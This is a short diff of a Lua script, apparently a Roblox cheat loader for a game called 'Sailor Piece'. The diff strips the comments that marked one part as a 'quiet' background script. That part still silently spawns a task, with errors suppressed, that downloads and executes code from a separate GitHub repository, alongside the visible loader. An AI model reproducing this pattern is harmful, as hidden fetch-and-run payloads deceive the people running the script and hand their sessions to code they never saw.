@@ -16,14 +16,9 @@ if isPrivate then
     return
 end
 
--- PUBLIC SERVER
-
--- Background (quiet) script
 task.spawn(function()
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/maharlika-owner/sailor/55a5630c119ee37e43c13eb6f28044ef9553abe5/Midgard%20New%20Sea%202%20Sailor%20Piece"))()
     end)
 end)
-
--- Main visible script
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HybridE3/HybridE3/refs/heads/main/Sailor%20Piece"))()
